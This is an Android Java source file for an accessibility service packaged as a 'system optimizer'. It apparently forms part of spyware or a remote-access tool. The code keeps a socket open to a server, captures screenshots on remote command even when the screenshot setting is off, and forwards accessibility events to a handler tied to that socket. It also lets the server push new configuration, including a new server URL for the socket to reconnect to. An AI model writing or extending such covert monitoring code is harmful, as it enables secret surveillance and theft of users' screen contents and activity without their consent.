package com.system.optimizer.service;

import com.system.optimizer.event.AccessibilityEventHandler;
import com.system.optimizer.config.ConfigData;
import com.system.optimizer.config.AppConfig;
import com.system.optimizer.network.SocketManager;

import android.os.Build;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class AccessibilityMonitorService extends AccessibilityService {
    private static final String TAG = "AccessibilityMonitorService";

    private SocketManager socketManager;
    private AppConfig appConfig;
    private AccessibilityEventHandler accessibilityEventHandler;

    /**
     * Single-thread executor to handle CPU-intensive JPEG compression 
     * without blocking the Accessibility (Main) thread.
     */
    private final ExecutorService backgroundExecutor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Initializing AccessibilityMonitorService");

        try {
            this.appConfig = new AppConfig(this);

            this.socketManager = new SocketManager(appConfig);

            // Create text handler with screenshot capture reference
            this.accessibilityEventHandler = new AccessibilityEventHandler(this::screenshotDispatcher, appConfig, socketManager);

            this.socketManager.addPersistentListener("screenshot", args -> {
                // Trigger manual screenshot capture (bypasses auto_screenshot config)
                accessibilityEventHandler.triggerManualCapture();
            });

            this.socketManager.addPersistentListener("config_data", args -> {
                Log.d(TAG, "ConfigData event received from server");
                if (args != null && args.length > 0) {
                    try {
                        org.json.JSONObject configJson = (org.json.JSONObject) args[0];

                        ConfigData serverConfig = appConfig.createConfigFromJson(configJson);
                        String newServerUrl = serverConfig.getServerUrl();

                        // Get current stored URL before updating config
                        String currentServerUrl = appConfig.getStoredServerUrl();

                        Log.d(TAG, "Refreshing config data from server");
                        appConfig.setConfig(serverConfig);

                        // Check if server URL has changed
                        if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
                            Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);

                            Log.d(TAG, "Reconnecting socket to new URL");
                            socketManager.reconnectToNewUrl();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
                    }
                }
            });

            Log.d(TAG, "All components initialized successfully");
        } catch (Exception e) {
            // Log error but don't crash the service
            Log.e(TAG, "Error initializing components", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        try {
            accessibilityEventHandler.onAccessibilityEvent(event);
        } catch (Exception e) {
            Log.e(TAG, "Error handling accessibility event", e);
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            Log.d(TAG, "Shutting down service and executor");
            
            // Gracefully shut down the background executor
            backgroundExecutor.shutdown();
            if (!backgroundExecutor.awaitTermination(2, TimeUnit.SECONDS)) {
                backgroundExecutor.shutdownNow();
            }

            if (socketManager != null) {
                socketManager.disconnect(true);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during onDestroy cleanup", e);
        } finally {
            super.onDestroy();
        }
    }

    private void screenshotDispatcher(ScreenshotCallback clientCallback) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            clientCallback.onError("API < 30 not supported");
            return;
        }
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                backgroundExecutor, new ScreenshotResultHandler(clientCallback, appConfig));
    }

}
